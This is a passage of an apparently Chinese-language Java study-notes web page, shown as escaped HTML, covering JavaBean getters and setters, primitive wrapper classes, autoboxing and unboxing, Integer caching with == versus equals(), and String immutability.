&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReadMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriteMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getAge&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="语法基础">语法基础&lt;/h2>
&lt;h3 id="变量数据类型">变量&amp;amp;数据类型&lt;/h3>
&lt;ul>
&lt;li>类似c的赋值风格：&lt;code>类型 变量名 = 变量值&lt;/code>（不同于go）&lt;/li>
&lt;li>程序设计的一个重要原则：数据的存储和显示要分离&lt;/li>
&lt;li>执行&lt;code>int x = n&lt;/code>这样的变量赋值时，相当于两步操作，x与n是不同的存储单元&lt;/li>
&lt;li>基本类型有&lt;code>byte&lt;/code>, &lt;code>int&lt;/code>, &lt;code>short&lt;/code>, &lt;code>long&lt;/code>, &lt;code>float&lt;/code>, &lt;code>double&lt;/code>, &lt;code>boolean&lt;/code>, &lt;code>char&lt;/code>（表示ascii或一个Unicode字符），不可赋值null&lt;/li>
&lt;li>引用类型为所有class和interface类型，可赋值为null表示空&lt;/li>
&lt;li>使用对应的Wrapper Class包装类可以将基本类型视为引用类型(class)，好处是可以使用大量的实用方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过new操作符创建Integer实例(不推荐使用,会有编译警告):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过静态方法valueOf(int)创建Integer实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过静态方法valueOf(String)创建Integer实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>每种基本类型都有其包装类型&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">基本类型&lt;/th>
&lt;th style="text-align:left">对应的引用类型&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">boolean&lt;/td>
&lt;td style="text-align:left">java.lang.Boolean&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">byte&lt;/td>
&lt;td style="text-align:left">java.lang.Byte&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">java.lang.Short&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">java.lang.Integer&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">java.lang.Long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">java.lang.Float&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">java.lang.Double&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">java.lang.Character&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>所有的整数和浮点数的包装类型都继承自&lt;code>Number&lt;/code>，因此，可以非常方便地直接通过包装类型获取各种基本类型&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 向上转型为Number:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">999&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取byte, int, long, float, double:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">byteValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">ln&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">longValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">floatValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doubleValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>由于java中并不存在无符号整型这一说，全部都是有整型的，需要通过包装类型的静态方法来完成，比如&lt;code>Byte.toUnsignedInt()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>int&lt;/code>和对应的&lt;code>Integer&lt;/code>可以互相转化，甚至直接使用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = 100; // 编译器自动使用Integer.valueOf(int)
int x = n; // 编译器自动使用Integer.intValue()
&lt;/code>&lt;/pre>&lt;p>这种直接把&lt;code>int&lt;/code>变为&lt;code>Integer&lt;/code>的赋值写法，称为自动装箱（Auto Boxing）；反过来，把&lt;code>Integer&lt;/code>变为&lt;code>int&lt;/code>的赋值写法，称为自动拆箱（Auto Unboxing）&lt;/p>
&lt;p>注意：自动装箱和自动拆箱只发生在编译阶段，目的是为了少写代码。&lt;/p>
&lt;p>装箱和拆箱会影响代码的执行效率，因为编译后的&lt;code>class&lt;/code>代码是严格区分基本类型和引用类型的。并且，自动拆箱执行时可能会报&lt;code>NullPointerException&lt;/code>（两种类型对null的容忍度不同&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// NullPointerException
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>所有包装类型都是不变类，和String一样通过内部的&lt;code>private final int&lt;/code>字段实现，无法派生子类&lt;/li>
&lt;li>判断值类型的变量是否相等可用&lt;code>==&lt;/code>，但是包装类型必须用&lt;code>equals&lt;/code>比较（引用类型存在值相等但指向不同对象的情况）！！！详细的演示&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x == y: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m == n: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x.equals(y): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m.equals(n): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>==&lt;/code>比较，较小的两个相同的&lt;code>Integer&lt;/code>返回&lt;code>true&lt;/code>，较大的两个相同的&lt;code>Integer&lt;/code>返回&lt;code>false&lt;/code>，这是因为&lt;code>Integer&lt;/code>是不变类，编译器把&lt;code>Integer x = 127;&lt;/code>自动变为&lt;code>Integer x = Integer.valueOf(127);&lt;/code>&lt;/p>
&lt;p>为了节省内存，&lt;code>Integer.valueOf()&lt;/code>对于较小的数，始终返回相同的实例，因此&lt;code>==&lt;/code>比较“恰好”为&lt;code>true&lt;/code>，但我们绝不能因为Java标准库的&lt;code>Integer&lt;/code>内部有缓存优化就用&lt;code>==&lt;/code>比较，必须用&lt;code>equals()&lt;/code>方法比较两个&lt;code>Integer&lt;/code>&lt;/p>
&lt;ul>
&lt;li>因为&lt;code>Integer.valueOf()&lt;/code>可能始终返回同一个&lt;code>Integer&lt;/code>实例，因此，在我们自己创建&lt;code>Integer&lt;/code>的时候，以下两种方法：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = new Integer(100);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>Integer n = Integer.valueOf(100);
&lt;/code>&lt;/pre>&lt;p>方法二更好，不用每次都new新的实例而是直接使用静态工厂方法进行调用，它会做到内部优化，尽可能地返回缓存的实例以节省内存&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>作引用类型，类似c中的指针，内部存储一个指向内存中的地址&lt;/li>
&lt;li>加上&lt;code>final&lt;/code>表示常量，创建实例后无法修改&lt;/li>
&lt;li>类型名过长时可用&lt;code>var&lt;/code>代替&lt;/li>
&lt;li>&lt;code>instanceof()&lt;/code>确定类型&lt;/li>
&lt;/ul>
&lt;h3 id="运算">运算&lt;/h3>
&lt;ul>
&lt;li>溢出不报错，注意自检&lt;/li>
&lt;li>优先级太多记不住，统一加括号完事了&lt;/li>
&lt;li>两种类型不同的数进行运算时会存在类型的隐式转换（short+int -&amp;gt; int+int），注意运算精度&lt;/li>
&lt;li>整数运算很准确，没有必要为了节省内存而使用&lt;code>byte&lt;/code>和&lt;code>short&lt;/code>进行整数运算&lt;/li>
&lt;li>整数运算在除数为&lt;code>0&lt;/code>时会报错，而浮点数运算在除数为&lt;code>0&lt;/code>时，不会报错，返回&lt;code>NAN&lt;/code> or &lt;code>Infinity&lt;/code> or &lt;code>-Infinity&lt;/code>&lt;/li>
&lt;li>布尔关系和三元运算中注意逻辑短路&lt;/li>
&lt;li>三元运算&lt;code>b ? x : y&lt;/code>后面的类型必须相同&lt;/li>
&lt;/ul>
&lt;h3 id="字符字符串">字符&amp;amp;字符串&lt;/h3>
&lt;ul>
&lt;li>Java的&lt;code>String&lt;/code>和&lt;code>char&lt;/code>在内存中总是以Unicode编码表示&lt;/li>
&lt;li>字符char用&lt;code>''&lt;/code>，字符串用&lt;code>&amp;quot;&amp;quot;&lt;/code>（空字符串不等于null），字符串拼接存在类型隐式转换，&lt;code>&amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot;&lt;/code>写多行字符串（同py）&lt;/li>
&lt;li>java中的字符串赋值操作可直接联想c的指针进行理解，通过内部的&lt;code>private final char[]&lt;/code>字段 以及没有任何修改&lt;code>char[]&lt;/code>的方法实现字符串的不可变性；基于这一点，如果传入的对象有可能改变，我们需要复制而不是直接引用&lt;/li>
&lt;li>字符串比较必须用&lt;code>equals()&lt;/code>或&lt;code>equalsIgnoreCase()&lt;/code>，不可偷懒用&lt;code>==&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>更多字符串的用法可几乎等同于Python，不列举&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>和&lt;code>char[]&lt;/code>类型可以互相转换&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>char[] cs = &amp;#34;Hello&amp;#34;.toCharArray(); // String -&amp;gt; char[]
String s = new String(cs); // char[] -&amp;gt; String
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如果修改了&lt;code>char[]&lt;/code>数组，&lt;code>String&lt;/code>并不会改变&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
